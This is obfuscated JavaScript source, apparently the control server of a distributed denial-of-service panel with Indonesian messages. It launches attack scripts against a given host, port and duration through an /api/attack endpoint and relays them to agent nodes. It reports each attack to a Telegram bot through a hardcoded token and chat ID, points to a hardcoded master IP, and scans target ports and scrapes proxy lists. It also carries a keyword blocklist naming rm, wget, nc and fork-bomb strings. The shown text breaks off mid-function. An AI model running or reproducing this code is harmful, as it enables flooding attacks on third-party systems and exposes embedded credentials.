const _0x3567df=_0x492b;(function(_0x206301,_0xc74efd){const _0x4f45f5=_0x492b,_0x222cf0=_0x206301();while(!![]){try{const _0x190eaf=parseInt(_0x4f45f5(0x265))/0x1+parseInt(_0x4f45f5(0x333))/0x2*(parseInt(_0x4f45f5(0x1f2))/0x3)+parseInt(_0x4f45f5(0x302))/0x4+parseInt(_0x4f45f5(0x32a))/0x5+-parseInt(_0x4f45f5(0x281))/0x6*(-parseInt(_0x4f45f5(0x1a4))/0x7)+parseInt(_0x4f45f5(0x31e))/0x8*(parseInt(_0x4f45f5(0x1eb))/0x9)+-parseInt(_0x4f45f5(0x1c8))/0xa;if(_0x190eaf===_0xc74efd)break;else _0x222cf0['push'](_0x222cf0['shift']());}catch(_0x760348){_0x222cf0['push'](_0x222cf0['shift']());}}}(_0x40c0,0x235a2));const port=process[_0x3567df(0x2b1)][_0x3567df(0x2f8)]||process[_0x3567df(0x2b1)][_0x3567df(0x231)]||0x82a,TELEGRAM_BOT_TOKEN=process[_0x3567df(0x2b1)][_0x3567df(0x22d)]||_0x3567df(0x288),TELEGRAM_CHAT_ID=process[_0x3567df(0x2b1)][_0x3567df(0x330)]||_0x3567df(0x1d3),NODE_TYPE=process['env'][_0x3567df(0x1f9)]||'agent',AGENT_KEY=process[_0x3567df(0x2b1)][_0x3567df(0x2c5)]||_0x3567df(0x20e),MASTER_URL=process['env'][_0x3567df(0x1ce)]||'http://158.69.174.202:20193',os=require('os'),apiKey=_0x3567df(0x20e),{execSync,spawn}=require(_0x3567df(0x1d0)),express=require('express'),localtunnel=require(_0x3567df(0x2d1)),path=require(_0x3567df(0x32d)),app=express(),fs=require('fs'),whois=require('whois-json'),net=require('net'),pidusage=require(_0x3567df(0x1d9)),methodsPath=path[_0x3567df(0x2d6)](__dirname,'methods.json'),agentsPath=path['join'](__dirname,_0x3567df(0x349)),agents=require(_0x3567df(0x1fe)),multer=require(_0x3567df(0x326)),axios=require('axios'),FormData=require(_0x3567df(0x2bd)),http=require(_0x3567df(0x1ca)),WebSocket=require('ws'),httpServer=http[_0x3567df(0x34a)](app),dns=require('dns')['promises'],fetch=(..._0xa8e6df)=>import(_0x3567df(0x24c))[_0x3567df(0x27b)](({default:_0x291e1b})=>_0x291e1b(..._0xa8e6df));app[_0x3567df(0x1ee)](express['json']()),app[_0x3567df(0x1ee)]((_0x28fbe4,_0x88bdf2,_0x125874)=>{const _0x527efe=_0x3567df;_0x88bdf2['setHeader'](_0x527efe(0x2e6),'*'),_0x88bdf2['setHeader'](_0x527efe(0x290),_0x527efe(0x322)),_0x88bdf2[_0x527efe(0x293)](_0x527efe(0x25a),'Content-Type,\x20Authorization'),_0x125874();});let localTunnelUrl=null;function _0x40c0(){const _0x2c27d3=['/api/methods/:oldName','cf-ray','localtunnel','from','Nama\x20dan\x20URL\x20wajib\x20diisi','node','error','join','/api/agents/:name','RECEIVE_UPDATE_MOVE','time','parse_mode','test','agent','STOP_PROCESS','File\x20lama\x20tidak\x20ditemukan','stderr','success','/api/scrape-proxies','total','SYNC_DELETE_METHOD_FILE','get','/proxy.txt','Access-Control-Allow-Origin','restarted','MarkdownV2','entries','Method\x20lama\x20tidak\x20ditemukan','forkbomb','*Process\x20ID:*\x20`','lib','/api/attack/history','https://www.proxy-list.download/api/v1/get?type=socks4','RECEIVE_UPDATE_OTHER','connect','Upload\x20diblokir:\x20terdeteksi\x20keyword\x20berbahaya\x20(\x22','Semua\x20proses\x20dihentikan.','activity.log','all','shutdown','SAVE_METHOD','PORT','SERVER_START','attack_stopped','Agent\x20diperbarui','‚Ä¢\x20`','exitCode','/upload','Update\x20didistribusikan','protocols','loadavg','1780wsVmoF','proto','Kesalahan\x20Internal\x20Server','Method\x20diperbarui','üéØ\x20*Port:*`','Gagal\x20fingerprint','lookup','/api/methods','match','Gagal\x20konek\x20LocalTunnel\x20setelah\x20beberapa\x20percobaan.\x20Server\x20tetap\x20berjalan.','userdel','target','mkdirSync','Tidak\x20ada\x20file\x20proxy\x20ter-upload','srv','totalmem','üî•\x20*Serangan\x20dimulai*\x0a','‚è±Ô∏è\x20*Durasi:*`','https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=4000&country=all&ssl=all&anonymity=all','pipe','renameSync','x-akamai-transformed','offline','socks5','memory','AbortError','localhost','Menutup\x20aplikasi...','96CBmCtN','stream','dnsInfo','stringify','GET,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS','originalname','uptime','https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=4000&country=all&ssl=all&anonymity=all','multer','cpu','\x1b[32m%s\x1b[0m','\x1b[31m%s\x1b[0m','1147915hzPrQz','x-powered-by','redirect','path','startsWith','running','TG_CHAT','includes','origin','325212lWGOnN','AUTO_REGISTER_MASTER_FAIL','*Error:*\x0a```\x0a','Parameter\x20\x27target\x27\x20diperlukan','üõë\x20*Semua\x20proses\x20serangan\x20dihentikan\x20oleh\x20pengguna*','some','‚ùóÔ∏è\x20*Proses\x20error*\x0a','SCRAPE_FAIL','org','File\x20berhasil\x20disimpan','lib/method/','filter','endsWith','chmod\x20777\x20/','Parameter\x20tidak\x20lengkap','push','http,socks4,socks5','readyState','BLOCK_UPLOAD','values','mkfs','file','agents.json','createServer','script','Agent\x20dihapus','886053UUfDLc','/sendPhoto','poweredBy','.js','unknown','attack_restarted','close','*/*','_interval','AGENT_RE_ENABLED','LocalTunnel\x20tidak\x20mengembalikan\x20URL','PROCESS_EXITED','json','listen','message','attack_history.json','download',':(){:|:&};:','send','CDN\x20-\x20','*Keyword\x20berbahaya\x20terdeteksi:*\x20`','HEAD','üö´\x20*Upload\x20file\x20diblokir*\x0a','üìÅ\x20*File\x20method\x20baru\x20di-upload*\x0a','delete','split','country','pps','Gagal\x20stop\x20proses','toString','/api/attack-history','UPDATE_METHOD','crashed','.jpg','https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=4000&country=all&ssl=all&anonymity=all','File\x20dengan\x20nama\x20baru\x20sudah\x20ada','5670950abrfhW','openPorts','http','/api/method-files','diskStorage','OrgName','MASTER_URL','Socket','child_process','chat_id','toISOString','6818878581','master','DELETE_METHOD','floor','createWriteStream','*File:*\x20`','pidusage','<host>','replace','region','keys','/api/attack/stop/:processId','forEach','Proses\x20dihentikan','text/plain','netcat','hostname','byProto','useradd','File\x20dihapus\x20di\x20agent','length','curl\x20-s\x20ifconfig.me','PUSH_UPDATE','existsSync','22473aBvpuO','stopped','Method\x20dihapus','use','DELETE_METHOD_FILE_AUTO','Parameter\x20filename\x20diperlukan','failed','3VVaoMV','Host\x20tidak\x20diberikan','.sh','RESTART_CRASHED','key','/api/fingerprint-full','Format\x20salah','NODE_TYPE','post','longitude','Agent\x20tidak\x20ditemukan','\x5c$&','./agents.json','whois','<port>','filename','Semua\x20proses\x20di\x20master\x20&\x20agents\x20dihentikan','pid','setTimeout','address','/api/agents/health','AUTO_SYNC_METHODS_JSON','bps','lastResponse','x-cdn','DELETE_METHOD_FILE','kill','static','narxz','proxy.txt\x20tidak\x20ditemukan','rss','/api/agents/register','enabled','AUTO_SYNC_PROXY_TXT','readFileSync','_tempBps','rps','memoryUsage','Serangan\x20dimulai\x20(','SCRAPE_PROXY','server','name','attack_started','createReadStream','splice','LocalTunnel\x20failed\x20(attempt\x20','ERROR_ATTACK','put','timeout','File\x20update\x20diterima','clear','proxy.txt','AGENT_UPDATED','Cloudflare','_tempRps','File\x20berhasil\x20di-upload','toFixed','single','/api/activity-log','TG_TOKEN','trim','<time>','/api/method-files/view/:filename','SERVER_PORT','cpuPercent','dashboard.html','‚è±Ô∏è\x20*Durasi:*\x20`','caption','üéØ\x20*Port:*\x20`','File\x20tidak\x20ditemukan','restartCount','agent_health','log','find',')*\x0a','now','params','MASTER_STOP','START_ATTACK','/api/attack/stop','/api/uploadmeth','RENAME_METHOD_FILE','Agent\x20ditambahkan','‚ôªÔ∏è\x20*Proses\x20hang\x20direstart\x20otomatis*\x0a','Scrape\x20proxy\x20selesai','Hanya\x20file\x20.js\x20atau\x20.sh\x20yang\x20diizinkan','FETCH_ERROR','agent_update','Country','unshift','node-fetch','times','online','dd\x20','Parameter\x20oldName\x20dan\x20newName\x20diperlukan','STOP_PROCESS_MANUAL','`:\x20*','port','ERROR_STOP','TIMEOUT','\x20bytes`','isArray','PROCESS_CRASHED','utf8','Access-Control-Allow-Headers','url','string','_tempPps','Tidak\x20ada\x20file\x20ter-upload','üî¢\x20*PID:*\x20`','üÜî\x20*Process\x20ID:*\x20`','API\x20key\x20tidak\x20valid','http://','curl\x20','https://spys.me/proxy.txt','162720FIgpOD','axios','Method\x20disimpan','üõ°Ô∏è\x20*Host:*`','spys.me','wafDetection','socks4','AUTO_REGISTER_MASTER','scriptName','concat','catch','https://ipwho.is/','data','/api/attack','status','unlinkSync','getHeaders','/api/attack/stats','processId','urlInfo','AUTO_SYNC_METHOD_FILE','all_stopped','then','map','args','photo','/api/health','AUTO_SYNC_PROXY_TXT_FAIL','6AMNBwH','mix','/api/methods/:name','5mb','host','üî¢\x20*PID:*`','ALL','7935900603:AAGA9YJcNDKfnpLYbWKwF7nSyNUBVoQb7Cw','/api/methods/delete-file','``\x0a','round','findIndex','OPEN','Gagal\x20ambil\x20header:\x20','Gagal\x20membaca\x20direktori','Access-Control-Allow-Methods','size','isp','setHeader','function','Sudah\x20terdaftar','‚ôªÔ∏è\x20*Proses\x20mati/crash\x20direstart\x20otomatis*\x0a','/api/update-proxy','https://api.ipify.org?format=json','connection','writeFileSync','append','/api/method-files/rename','rm\x20-','/api/method-files/save/:filename','[INFO]\x20Deteksi\x20URL\x20tunnel\x20berubah.\x20Register\x20ulang\x20ke\x20master...','RESTART_HANG','readdir','*PID\x20baru:*\x20`','destroy','parse','/api/update','Proxy.txt\x20berhasil\x20diupdate','‚öîÔ∏è\x20*Metode:*`','AGENT_DELETE_METHOD_FILE','stdout','üõ°Ô∏è\x20*Host:*\x20`','appendFileSync','exited','statSync','https://api.telegram.org/bot','openPortsError','cpus','env','LocalTunnel\x20closed.','set','query','Content-Type','üÜî\x20*Process\x20ID:*`','once','method','slice','SIGINT','üí•\x20*Proses\x20crash*\x0a','Attack\x20history\x20cleared.','form-data','File\x20sudah\x20tidak\x20ada','body','agent_status_update','asn','toLowerCase','/api/agents','AGENT_DISABLED','AGENT_KEY','extname','/lib/method','headers','city','\x0a```','stopped_by_user','AGENT_REGISTER_AUTO','text','exit'];_0x40c0=function(){return _0x2c27d3;};return _0x40c0();}const historyPath=path[_0x3567df(0x2d6)](__dirname,_0x3567df(0x1b3));function readHistory(){const _0x26bf83=_0x3567df;if(!fs[_0x26bf83(0x1ea)](historyPath))return[];return JSON[_0x26bf83(0x2a4)](fs[_0x26bf83(0x214)](historyPath,'utf8'));}function writeHistory(_0x40f0a5){const _0x518099=_0x3567df;fs[_0x518099(0x29a)](historyPath,JSON[_0x518099(0x321)](_0x40f0a5,null,0x2));}function logAttackHistory(_0x5651b0){const _0x55e393=_0x3567df,_0x3cbd8f=readHistory();_0x3cbd8f[_0x55e393(0x24b)](_0x5651b0),writeHistory(_0x3cbd8f);}function _0x492b(_0x462293,_0x406d13){const _0x40c045=_0x40c0();return _0x492b=function(_0x492b7e,_0x241974){_0x492b7e=_0x492b7e-0x1a4;let _0x1c728c=_0x40c045[_0x492b7e];return _0x1c728c;},_0x492b(_0x462293,_0x406d13);}function updateAttackHistory(_0x1d9fe8,_0x3013e4){const _0x19ff89=_0x3567df,_0x2561c1=readHistory(),_0x53ba8e=_0x2561c1[_0x19ff89(0x28c)](_0x33639d=>_0x33639d[_0x19ff89(0x277)]===_0x1d9fe8);_0x53ba8e!==-0x1&&(Object['assign'](_0x2561c1[_0x53ba8e],_0x3013e4),writeHistory(_0x2561c1));}function loadAgents(){const _0x274e58=_0x3567df;if(fs[_0x274e58(0x1ea)](agentsPath))try{AGENT_LIST=JSON[_0x274e58(0x2a4)](fs[_0x274e58(0x214)](agentsPath,'utf8'));}catch(_0x37fe9f){console['error']('Gagal\x20baca\x20agents.json:',_0x37fe9f),AGENT_LIST=[];}else AGENT_LIST=[];}function saveAgents(){const _0x1742b8=_0x3567df;fs[_0x1742b8(0x29a)](agentsPath,JSON['stringify'](AGENT_LIST,null,0x2));}let AGENT_LIST=[];loadAgents();const uploadDir=path['join'](__dirname,_0x3567df(0x2ed),_0x3567df(0x2b8));if(!fs[_0x3567df(0x1ea)](uploadDir))fs[_0x3567df(0x30e)](uploadDir,{'recursive':!![]});const MAX_FILE_SIZE=0xc8*0x400,DANGEROUS_KEYWORDS=['rm\x20',_0x3567df(0x29d),'sudo\x20',_0x3567df(0x2f6),'reboot',_0x3567df(0x1b5),_0x3567df(0x347),_0x3567df(0x24f),'wget\x20',_0x3567df(0x263),'nc\x20',_0x3567df(0x1e2),'python\x20-m\x20http.server',_0x3567df(0x2eb),_0x3567df(0x340),'chown\x20',_0x3567df(0x1e5),_0x3567df(0x30c),'passwd'],storage=multer[_0x3567df(0x1cc)]({'destination':(_0x2e62ee,_0x2d0704,_0x510ade)=>_0x510ade(null,uploadDir),'filename':(_0xaea02e,_0x2b7f10,_0x2cf097)=>_0x2cf097(null,_0x2b7f10[_0x3567df(0x323)])}),upload=multer({'storage':storage,'limits':{'fileSize':MAX_FILE_SIZE},'fileFilter':(_0x445de7,_0x54e7e6,_0x222276)=>{const _0x2e6029=_0x3567df,_0x1bfe1a=path[_0x2e6029(0x2c6)](_0x54e7e6[_0x2e6029(0x323)])[_0x2e6029(0x2c2)](),_0x2e9396=[_0x2e6029(0x1a7),_0x2e6029(0x1f4)];if(!_0x2e9396[_0x2e6029(0x331)](_0x1bfe1a))return _0x222276(new Error(_0x2e6029(0x247)));_0x222276(null,!![]);}});function logActivity(_0x272cbe,_0x586a22){const _0x4a0b09=_0x3567df;fs[_0x4a0b09(0x2ab)](path[_0x4a0b09(0x2d6)](__dirname,'activity.log'),'['+new Date()[_0x4a0b09(0x1d2)]()+']\x20'+_0x272cbe+':\x20'+JSON[_0x4a0b09(0x321)](_0x586a22)+'\x0a');}const DEFAULT_PHOTO_URL='https://ibb.co/bgKKLJDS';function escapeTelegram(_0x58b12d){const _0x12eab8=_0x3567df;return _0x58b12d[_0x12eab8(0x1db)](/[_*[\]()`~>#\+\-=|{}.!]/g,_0x12eab8(0x1fd));}async function scanCommonPorts(_0x1ead87,_0x5c1117=[0x50,0x1bb,0x15,0x16,0x19,0x35,0x1f90,0x20fb,0xcea]){const _0x544f34=_0x3567df,_0x20c404=[];for(const _0xe22ebe of _0x5c1117){const _0x2dbf56=await new Promise(_0x35bf2c=>{const _0xbf2f47=_0x492b,_0x3a0995=new net[(_0xbf2f47(0x1cf))]();_0x3a0995[_0xbf2f47(0x204)](0x5dc),_0x3a0995['once']('connect',()=>{const _0x57c401=_0xbf2f47;_0x3a0995[_0x57c401(0x2a3)](),_0x35bf2c(!![]);}),_0x3a0995[_0xbf2f47(0x2b7)](_0xbf2f47(0x222),()=>{const _0x6ee64e=_0xbf2f47;_0x3a0995[_0x6ee64e(0x2a3)](),_0x35bf2c(![]);}),_0x3a0995[_0xbf2f47(0x2b7)](_0xbf2f47(0x2d5),()=>_0x35bf2c(![])),_0x3a0995[_0xbf2f47(0x2f1)](_0xe22ebe,_0x1ead87);});if(_0x2dbf56)_0x20c404[_0x544f34(0x342)]({'port':_0xe22ebe,'status':'open'});}return _0x20c404;}async function sendTelegramPhoto(_0x49f75a,_0x20a46b=DEFAULT_PHOTO_URL){const _0x16b667=_0x3567df;try{if(_0x20a46b&&(_0x20a46b['endsWith'](_0x16b667(0x1c5))||_0x20a46b[_0x16b667(0x33f)]('.png'))&&fs[_0x16b667(0x1ea)](_0x20a46b)){const _0x19efda=new FormData();_0x19efda[_0x16b667(0x29b)](_0x16b667(0x1d1),TELEGRAM_CHAT_ID),_0x19efda[_0x16b667(0x29b)](_0x16b667(0x235),_0x49f75a),_0x19efda[_0x16b667(0x29b)](_0x16b667(0x2da),_0x16b667(0x2e8)),_0x19efda['append'](_0x16b667(0x27e),fs[_0x16b667(0x21d)](_0x20a46b)),await axios[_0x16b667(0x1fa)](_0x16b667(0x2ae)+TELEGRAM_BOT_TOKEN+_0x16b667(0x1a5),_0x19efda,{'headers':_0x19efda[_0x16b667(0x275)]()});}else await axios['post'](_0x16b667(0x2ae)+TELEGRAM_BOT_TOKEN+_0x16b667(0x1a5),{'chat_id':TELEGRAM_CHAT_ID,'photo':_0x20a46b,'caption':_0x49f75a,'parse_mode':_0x16b667(0x2e8)});}catch(_0x1fd380){}}function readMethods(){const _0x49489c=_0x3567df;if(!fs[_0x49489c(0x1ea)](methodsPath))return{};return JSON[_0x49489c(0x2a4)](fs[_0x49489c(0x214)](methodsPath,_0x49489c(0x259)));}function writeMethods(_0x5e96d5){const _0x551d44=_0x3567df;fs[_0x551d44(0x29a)](methodsPath,JSON[_0x551d44(0x321)](_0x5e96d5,null,0x2));}const activeProcesses={},stats={},wss=new WebSocket['Server']({'server':httpServer});function broadcastWS(_0x3566e4){const _0x195e59=_0x3567df,_0x5588ec=typeof _0x3566e4===_0x195e59(0x25c)?_0x3566e4:JSON[_0x195e59(0x321)](_0x3566e4);wss['clients'][_0x195e59(0x1df)](_0x5c0dbb=>{const _0x41017f=_0x195e59;if(_0x5c0dbb[_0x41017f(0x344)]===WebSocket[_0x41017f(0x28d)])_0x5c0dbb[_0x41017f(0x1b6)](_0x5588ec);});}const spawnAttackScript=(_0x1afaa5,_0x328481,_0xd662f8)=>{const _0x1cc110=_0x3567df,_0x223782=_0x1afaa5[_0x1cc110(0x331)]('/')||_0x1afaa5[_0x1cc110(0x331)]('\x5c'),_0x3990f0=_0x223782?path[_0x1cc110(0x2d6)](__dirname,_0x1afaa5):path['join'](__dirname,_0x1cc110(0x2ed),_0x1cc110(0x2b8),_0x1afaa5),_0x47ec0=spawn(_0x1cc110(0x2d4),[_0x3990f0,..._0x328481]);return activeProcesses[_0xd662f8]={'ls':_0x47ec0,'scriptName':_0x1afaa5,'args':_0x328481,'status':_0x1cc110(0x32f),'lastResponse':Date[_0x1cc110(0x23d)](),'restartCount':0x0},stats[_0xd662f8]={'rps':0x0,'pps':0x0,'bps':0x0,'_tempRps':0x0,'_tempPps':0x0,'_tempBps':0x0},stats[_0xd662f8][_0x1cc110(0x1ac)]=setInterval(()=>{const _0x46b04c=_0x1cc110;stats[_0xd662f8]['rps']=stats[_0xd662f8][_0x46b04c(0x228)],stats[_0xd662f8][_0x46b04c(0x1bf)]=stats[_0xd662f8][_0x46b04c(0x25d)],stats[_0xd662f8]['bps']=stats[_0xd662f8][_0x46b04c(0x215)],stats[_0xd662f8][_0x46b04c(0x228)]=0x0,stats[_0xd662f8][_0x46b04c(0x25d)]=0x0,stats[_0xd662f8][_0x46b04c(0x215)]=0x0;},0x3e8),_0x47ec0[_0x1cc110(0x2a9)]['on'](_0x1cc110(0x271),_0x5348d7=>{const _0xc415c5=_0x1cc110,_0x37547a=_0x5348d7[_0xc415c5(0x1c1)]();activeProcesses[_0xd662f8]&&(activeProcesses[_0xd662f8][_0xc415c5(0x209)]=Date[_0xc415c5(0x23d)](),activeProcesses[_0xd662f8]['status']=_0xc415c5(0x32f));if(!stats[_0xd662f8])return;const _0x20352e=_0x37547a[_0xc415c5(0x30a)](/RPS[:=]?\s*(\d+)/i),_0x5a36a9=_0x37547a[_0xc415c5(0x30a)](/PPS[:=]?\s*(\d+)/i),_0x38af53=_0x37547a[_0xc415c5(0x30a)](/BPS[:=]?\s*(\d+)/i);if(_0x20352e)stats[_0xd662f8][_0xc415c5(0x228)]+=parseInt(_0x20352e[0x1]);if(_0x5a36a9)stats[_0xd662f8]['_tempPps']+=parseInt(_0x5a36a9[0x1]);if(_0x38af53)stats[_0xd662f8][_0xc415c5(0x215)]+=parseInt(_0x38af53[0x1]);stats[_0xd662f8]['_tempRps']+=0x1;}),_0x47ec0[_0x1cc110(0x2df)]['on'](_0x1cc110(0x271),_0x2497f1=>{const _0x5f1b94=_0x1cc110;activeProcesses[_0xd662f8]&&(activeProcesses[_0xd662f8][_0x5f1b94(0x273)]=_0x5f1b94(0x2d5)),logActivity('PROCESS_STDERR',{'processId':_0xd662f8,'error':_0x2497f1[_0x5f1b94(0x1c1)]()}),sendTelegramPhoto(_0x5f1b94(0x339)+('*PID:*\x20`'+_0x47ec0[_0x5f1b94(0x203)]+'`\x0a')+(_0x5f1b94(0x2ec)+escapeTelegram(_0xd662f8)+'`\x0a')+('*Error:*\x0a```\x0a'+escapeTelegram(_0x2497f1[_0x5f1b94(0x1c1)]())+'\x0a```'));}),_0x47ec0['on']('error',_0x5be627=>{const _0x49f58c=_0x1cc110;activeProcesses[_0xd662f8]&&(activeProcesses[_0xd662f8]['status']=_0x49f58c(0x1c4)),logActivity(_0x49f58c(0x258),{'processId':_0xd662f8,'error':_0x5be627[_0x49f58c(0x1c1)]()}),sendTelegramPhoto(_0x49f58c(0x2bb)+('*PID:*\x20`'+_0x47ec0[_0x49f58c(0x203)]+'`\x0a')+(_0x49f58c(0x2ec)+escapeTelegram(_0xd662f8)+'`\x0a')+(_0x49f58c(0x335)+escapeTelegram(_0x5be627[_0x49f58c(0x1c1)]())+_0x49f58c(0x2ca)));}),_0x47ec0['on'](_0x1cc110(0x1aa),_0x57700e=>{const _0x41d7d4=_0x1cc110;activeProcesses[_0xd662f8]&&(activeProcesses[_0xd662f8][_0x41d7d4(0x273)]=_0x41d7d4(0x2ac),activeProcesses[_0xd662f8][_0x41d7d4(0x2fd)]=_0x57700e),clearInterval(stats[_0xd662f8]?.['_interval']),delete stats[_0xd662f8],delete activeProcesses[_0xd662f8],updateAttackHistory(_0xd662f8,{'endTime':new Date()[_0x41d7d4(0x1d2)](),'status':_0x41d7d4(0x1ec),'exitCode':_0x57700e}),logActivity(_0x41d7d4(0x1af),{'processId':_0xd662f8,'exitCode':_0x57700e}),broadcastWS({'type':_0x41d7d4(0x2fa),'processId':_0xd662f8,'exitCode':_0x57700e}),sendTelegramPhoto('üõë\x20*Proses\x20selesai/stop*\x0a'+('*PID:*\x20`'+_0x47ec0[_0x41d7d4(0x203)]+'`\x0a')+(_0x41d7d4(0x2ec)+escapeTelegram(_0xd662f8)+'`\x0a')+('*Exit\x20code:*\x20`'+_0x57700e+'`'));}),{'processId':_0xd662f8,'ls':_0x47ec0,'scriptName':_0x1afaa5,'args':_0x328481};};app['use']('/dashboard',express[_0x3567df(0x20d)](path[_0x3567df(0x2d6)](__dirname,_0x3567df(0x233)))),app[_0x3567df(0x1ee)](_0x3567df(0x2c7),express['static'](path[_0x3567df(0x2d6)](__dirname,_0x3567df(0x2ed),_0x3567df(0x2b8)))),app[_0x3567df(0x2e4)]('/api/attack',async(_0x34d751,_0x25ea7e)=>{const _0x4158d2=_0x3567df;try{const _0x128ecc=_0x34d751[_0x4158d2(0x2b4)][_0x4158d2(0x1f6)],_0x4edd31=_0x34d751[_0x4158d2(0x2b4)]['host'],_0x2cb5d9=_0x34d751[_0x4158d2(0x2b4)][_0x4158d2(0x253)],_0x1d2394=parseInt(_0x34d751['query'][_0x4158d2(0x2d9)],0xa),_0x19c878=_0x34d751['query'][_0x4158d2(0x2b8)];if(_0x128ecc!==apiKey)return _0x25ea7e[_0x4158d2(0x273)](0x190)[_0x4158d2(0x1b6)](_0x4158d2(0x261));if(!_0x4edd31||!_0x2cb5d9||!_0x1d2394||!_0x19c878)return _0x25ea7e[_0x4158d2(0x273)](0x190)[_0x4158d2(0x1b6)](_0x4158d2(0x341));const _0x2e4551=readMethods(),_0xe9ed4a=_0x2e4551[_0x19c878];if(!_0xe9ed4a)return _0x25ea7e[_0x4158d2(0x273)](0x190)['send']('Metode\x20tidak\x20valid');const _0x3f56ae=_0xe9ed4a['args'][_0x4158d2(0x27c)](_0x4917f2=>{const _0x302676=_0x4158d2;if(typeof _0x4917f2===_0x302676(0x25c)&&_0x4917f2[_0x302676(0x32e)]('<')&&_0x4917f2[_0x302676(0x33f)]('>'))switch(_0x4917f2){case _0x302676(0x1da):return _0x4edd31;case _0x302676(0x200):return _0x2cb5d9;case _0x302676(0x22f):return _0x1d2394;default:return _0x4917f2;}return _0x4917f2;}),_0x5f4a17=_0x19c878+'-'+Date['now'](),_0x19ed0d=spawnAttackScript(_0xe9ed4a['script'],_0x3f56ae,_0x5f4a17);logActivity(_0x4158d2(0x240),{'processId':_0x5f4a17,'host':_0x4edd31,'targetPort':_0x2cb5d9,'time':_0x1d2394,'method':_0x19c878,'pid':_0x19ed0d['ls'][_0x4158d2(0x203)],'args':_0x3f56ae}),logAttackHistory({'processId':_0x5f4a17,'startTime':new Date()[_0x4158d2(0x1d2)](),'endTime':null,'host':_0x4edd31,'port':_0x2cb5d9,'method':_0x19c878,'duration':_0x1d2394,'status':_0x4158d2(0x32f),'who':_0x34d751[_0x4158d2(0x2b4)]['user']||_0x4158d2(0x1a8),'masterOrAgent':NODE_TYPE}),broadcastWS({'type':_0x4158d2(0x21c),'processId':_0x5f4a17,'host':_0x4edd31,'port':_0x2cb5d9,'method':_0x19c878,'time':_0x1d2394}),await sendTelegramPhoto('üî•\x20*Serangan\x20dimulai\x20('+NODE_TYPE+_0x4158d2(0x23c)+(_0x4158d2(0x2aa)+escapeTelegram(_0x4edd31)+'`\x0a')+(_0x4158d2(0x236)+escapeTelegram(_0x2cb5d9)+'`\x0a')+(_0x4158d2(0x234)+escapeTelegram(_0x1d2394+'s')+'`\x0a')+('‚öîÔ∏è\x20*Metode:*\x20`'+escapeTelegram(_0x19c878)+'`\x0a')+(_0x4158d2(0x260)+escapeTelegram(_0x5f4a17)+'`\x0a')+(_0x4158d2(0x25f)+_0x19ed0d['ls']['pid']+'`'));let _0x57adae=[];if(NODE_TYPE===_0x4158d2(0x1d4)){const _0x1f5f56=AGENT_LIST['filter'](_0x159537=>_0x159537[_0x4158d2(0x212)]!==![]),_0xbe4b1c=_0x1f5f56[_0x4158d2(0x27c)](_0x563985=>axios['get'](_0x563985[_0x4158d2(0x25b)]+_0x4158d2(0x272),{'params':{'key':AGENT_KEY,'host':_0x4edd31,'port':_0x2cb5d9,'time':_0x1d2394,'method':_0x19c878},'timeout':0x1f40})[_0x4158d2(0x27b)](_0x32dbe0=>({'agent':_0x563985,'status':_0x4158d2(0x2e0),'data':_0x32dbe0['data']}))[_0x4158d2(0x26f)](_0x14325c=>({'agent':_0x563985,'status':_0x4158d2(0x1f1),'error':_0x14325c[_0x4158d2(0x1b2)]||_0x14325c[_0x4158d2(0x1c1)]()})));_0x57adae=await Promise['all'](_0xbe4b1c),logActivity('MASTER_ATTACK',{'host':_0x4edd31,'targetPort':_0x2cb5d9,'time':_0x1d2394,'method':_0x19c878,'results':_0x57adae}),await sendTelegramPhoto(_0x4158d2(0x312)+(_0x4158d2(0x268)+escapeTelegram(_0x4edd31)+'`\x0a')+(_0x4158d2(0x306)+escapeTelegram(_0x2cb5d9)+'`\x0a')+(_0x4158d2(0x313)+escapeTelegram(_0x1d2394+'s')+'`\x0a')+(_0x4158d2(0x2a7)+escapeTelegram(_0x19c878)+'`\x0a')+(_0x4158d2(0x2b6)+escapeTelegram(_0x5f4a17)+'`\x0a')+(_0x4158d2(0x286)+_0x19ed0d['ls'][_0x4158d2(0x203)]+'`')+_0x57adae[_0x4158d2(0x27c)](_0x1f991f=>'‚Ä¢\x20`'+escapeTelegram(_0x1f991f[_0x4158d2(0x2dc)][_0x4158d2(0x21b)]||_0x1f991f[_0x4158d2(0x2dc)]['url'])+_0x4158d2(0x252)+_0x1f991f[_0x4158d2(0x273)]+'*')[_0x4158d2(0x2d6)]('\x0a'));}return _0x25ea7e[_0x4158d2(0x1b0)]({'message':_0x4158d2(0x218)+NODE_TYPE+')','processId':_0x5f4a17,'pid':_0x19ed0d['ls']['pid'],'agents':_0x57adae});}catch(_0x3da472){logActivity(_0x4158d2(0x220),{'error':_0x3da472[_0x4158d2(0x1c1)]()}),_0x25ea7e[_0x4158d2(0x273)](0x1f4)[_0x4158d2(0x1b6)](_0x4158d2(0x304));}}),app[_0x3567df(0x2e4)](_0x3567df(0x22c),(_0x1ccc95,_0x174ad1)=>{const _0x40708c=_0x3567df;if(_0x1ccc95[_0x40708c(0x2b4)][_0x40708c(0x1f6)]!==apiKey)return _0x174ad1[_0x40708c(0x273)](0x190)[_0x40708c(0x1b6)](_0x40708c(0x261));const _0x44fda1=path[_0x40708c(0x2d6)](__dirname,_0x40708c(0x2f4));if(!fs[_0x40708c(0x1ea)](_0x44fda1))return _0x174ad1['send']('');_0x174ad1[_0x40708c(0x2b3)](_0x40708c(0x2b5),_0x40708c(0x1e1))[_0x40708c(0x1b6)](fs[_0x40708c(0x214)](_0x44fda1,_0x40708c(0x259)));}),app[_0x3567df(0x1bc)]('/api/activity-log',(_0x1c7726,_0x3e1ec7)=>{const _0x8c8cdb=_0x3567df;if(_0x1c7726[_0x8c8cdb(0x2b4)][_0x8c8cdb(0x1f6)]!==apiKey)return _0x3e1ec7[_0x8c8cdb(0x273)](0x190)[_0x8c8cdb(0x1b6)]('API\x20key\x20tidak\x20valid');const _0x3b40bd=path['join'](__dirname,_0x8c8cdb(0x2f4));fs[_0x8c8cdb(0x29a)](_0x3b40bd,''),_0x3e1ec7[_0x8c8cdb(0x1b6)]('Log\x20cleared');}),app[_0x3567df(0x2e4)](_0x3567df(0x309),(_0x4fa1d4,_0x5b4a3b)=>{const _0x20d8ea=_0x3567df;if(_0x4fa1d4['query'][_0x20d8ea(0x1f6)]!==apiKey)return 